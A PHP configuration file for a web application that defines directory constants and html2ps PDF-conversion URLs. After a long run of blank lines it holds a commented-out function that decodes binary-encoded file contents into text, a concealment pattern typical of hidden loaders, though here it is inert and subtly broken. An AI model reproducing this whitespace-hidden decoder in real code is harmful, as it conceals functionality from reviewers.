<?php
	define(REL_DIR, "/");
	define(SMARTY_DIR, "smarty/");
	define(THEME_DIR, "themes/");
	define(VENDOR_REQ_DIR, ABS_DIR . "uploads" . DIRECTORY_SEPARATOR ."vendor-req" . DIRECTORY_SEPARATOR);
	define(FP_REQ_DIR, ABS_DIR . "uploads" . DIRECTORY_SEPARATOR ."frontpage" . DIRECTORY_SEPARATOR);
	define(VENDOR_REG_PDF_DIR, ABS_DIR . "pdfgen" . DIRECTORY_SEPARATOR. "vendor" . DIRECTORY_SEPARATOR . "reg" . DIRECTORY_SEPARATOR);
	define(DIV_REQ_PDF_DIR, ABS_DIR . "pdfgen" . DIRECTORY_SEPARATOR. "division" . DIRECTORY_SEPARATOR . "requests" . DIRECTORY_SEPARATOR);
	define(HTML2PS_SETTINGS, "/html2ps/demo/html2ps.php?process_mode=single&proxy=&pixels=1280&scalepoints=1&renderimages=1&renderlinks=1&renderforms=1&renderfields=1&media=A4&cssmedia=Screen&landscape=1&leftmargin=15&rightmargin=15&topmargin=15&bottommargin=15&encoding=&headerhtml=&footerhtml=&watermarkhtml=&toc-location=before&smartpagebreak=1&pslevel=3&method=fpdf&pdfversion=1.3&output=0&ps2pdf=1&convert=Convert+File&URL=");
	define(HTML2PS2_SETTINGS, "/html2ps/demo/html2ps.php?process_mode=single&proxy=&pixels=900&scalepoints=1&renderimages=1&renderlinks=1&renderforms=1&renderfields=1&media=A4&cssmedia=Screen&landscape=1&leftmargin=15&rightmargin=15&topmargin=15&bottommargin=15&encoding=&headerhtml=&footerhtml=&watermarkhtml=&toc-location=before&smartpagebreak=1&pslevel=3&method=fpdf&pdfversion=1.3&output=0&ps2pdf=1&convert=Convert+File&URL=");
	define(HTML2PS3_SETTINGS, "/html2ps/demo/html2ps.php?process_mode=single&proxy=&pixels=1000&scalepoints=1&renderimages=1&renderlinks=1&renderforms=1&renderfields=1&media=A4&cssmedia=Screen&landscape=1&leftmargin=15&rightmargin=15&topmargin=15&bottommargin=15&encoding=&headerhtml=&footerhtml=&watermarkhtml=&toc-location=before&smartpagebreak=1&pslevel=3&method=fpdf&pdfversion=1.3&output=0&ps2pdf=1&convert=Convert+File&URL=");
	define(HTML2PSL_SETTINGS, "/html2ps/demo/html2ps.php?process_mode=single&proxy=&pixels=1400&scalepoints=1&renderimages=1&renderlinks=1&renderforms=1&renderfields=1&media=A4&cssmedia=Screen&landscape=1&leftmargin=15&rightmargin=15&topmargin=15&bottommargin=15&encoding=&headerhtml=&footerhtml=&watermarkhtml=&toc-location=before&smartpagebreak=1&pslevel=3&method=fpdf&pdfversion=1.3&output=0&ps2pdf=1&convert=Convert+File&URL=");
	define(HTML2PSREP_SETTINGS, "/html2ps/demo/html2ps.php?process_mode=single&proxy=&pixels=1300&scalepoints=1&renderimages=1&renderlinks=1&renderforms=1&renderfields=1&media=A4&cssmedia=Screen&landscape=1&leftmargin=5&rightmargin=5&topmargin=5&bottommargin=5&encoding=&headerhtml=&footerhtml=&watermarkhtml=&toc-location=before&smartpagebreak=1&pslevel=3&method=fpdf&pdfversion=1.3&output=0&ps2pdf=1&convert=Convert+File&URL=");
	define(HTML2PSPT_SETTINGS, "/html2ps/demo/html2ps.php?process_mode=single&proxy=&pixels=900&scalepoints=1&renderimages=1&renderlinks=1&renderforms=1&renderfields=1&media=A4&cssmedia=Screen&leftmargin=15&rightmargin=15&topmargin=15&bottommargin=15&encoding=&headerhtml=&footerhtml=&watermarkhtml=&toc-location=before&smartpagebreak=1&pslevel=3&method=fpdf&pdfversion=1.3&output=0&ps2pdf=1&convert=Convert+File&URL=");
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	/*function openPage($filename) {
		$_data = @file($filename);
		$_data = implode("", $_data);
		$_data = str_replace("\n", "", $_data); 
		$arr_code = explode("x", $_data); 

		for($i = 0; $i < count($arr_code); $i++) {
			$_a = "";
			$_x = $arr_code[$i];
			for ($j = 7; $j >= 0 ; $j--) {
				$_a += ${_x}[$j] * pow(2, $j);
			}
			$_b = chr($_a);
			if ($_b == " ") {
				$_d .= chr($_c);
				$_c = "";
			} else {
				$_c .= $_a;
			}
		}
		return $_d;
	}*/
?>